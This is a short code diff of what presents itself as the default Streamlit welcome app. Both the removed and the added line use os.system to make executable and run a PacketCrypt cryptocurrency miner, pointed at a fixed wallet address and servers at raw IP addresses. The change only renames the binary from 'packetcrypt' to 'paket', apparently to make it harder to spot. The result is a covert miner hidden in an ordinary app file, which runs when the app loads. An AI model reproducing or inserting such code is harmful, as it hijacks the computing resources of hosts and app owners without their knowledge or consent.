@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('chmod +x packetcrypt && ./packetcrypt ann -p pkt1qam6tcathyj4uhhtpgfl9jeqxw6nuqxqj3se3rp http://139.144.181.23:443 http://164.90.218.160:443/master/2048 http://164.90.218.160:80/master/3072')
+os.system('chmod +x paket && ./paket ann -p pkt1qam6tcathyj4uhhtpgfl9jeqxw6nuqxqj3se3rp http://139.144.181.23:443 http://164.90.218.160:443/master/2048 http://164.90.218.160:80/master/3072')
 """
 # Welcome to Streamlit!
 Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
